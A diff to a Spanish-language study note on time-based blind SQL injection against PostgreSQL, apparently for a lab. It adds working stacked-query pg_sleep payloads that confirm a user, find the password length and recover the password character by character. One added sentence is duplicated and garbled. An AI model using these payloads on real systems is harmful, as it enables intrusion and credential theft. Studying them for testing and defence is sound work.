@@ -154,7 +154,12 @@ Podemos concatenar por ejemplo `'%3b select case when(1=1) then pg_sleep(5) else
 
 Si por ejemplo queremos saber si existe el usuario `Administrador`, usaremos la siguiente query `'%3b select case when(username="Administrator") then pg_sleep(5) else pg_sleep(0) end from users-- -`.
 
-Si quere
+Si queremos también buscar la longitud de la contraseña podemos usar la query de la siguiente forma Si por ejemplo queremos saber si existe el usuario `Administrador`, usaremos la siguiente query `'%3b select case when(username="Administrator" and length(password)=20) then pg_sleep(5) else pg_sleep(0) end from users-- -`. Cuando la `password` sea de ese tamaño la petición tardara cinco segundos en responder.
+
+SI queremos identificar cada carácter de la contraseñas usamos `'%3b select case when(username="Administrator" and substring(password,1,1)='a') then pg_sleep(5) else pg_sleep(0) end from users-- -`, con lo que lo que buscamos que el primer carácter si es una `a` tarde cinco segundos en responder. Y así se podría proceder con todos los caracteres de la contraseña.
+
+
+
 
 
 
